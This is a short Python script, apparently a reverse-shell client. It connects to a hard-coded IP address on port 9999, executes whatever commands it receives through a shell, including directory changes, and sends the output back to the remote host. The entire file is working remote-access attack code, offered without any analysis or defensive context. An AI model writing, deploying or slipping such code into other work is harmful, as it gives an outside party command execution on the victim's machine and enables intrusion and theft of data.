import socket
import os
import subprocess

s = socket.socket()
host = "10.48.64.73"
port = 9999
s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":    # Get first 2 characters and decode (Ex: cd ..)
        os.chdir(data[3:].decode("utf-8"))  # Get all characters after 3rd

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True, 
                               stdout = subprocess.PIPE, 
                               stdin = subprocess.PIPE, 
                               stderr = subprocess.PIPE)
        outputByte = cmd.stdout.read() + cmd.stderr.read()
        outputStr = str(outputByte, "utf-8")
        currentWorkingDirectory = os.getcwd() + "> "
        s.send(str.encode(outputStr + currentWorkingDirectory))
        
        print(outputStr)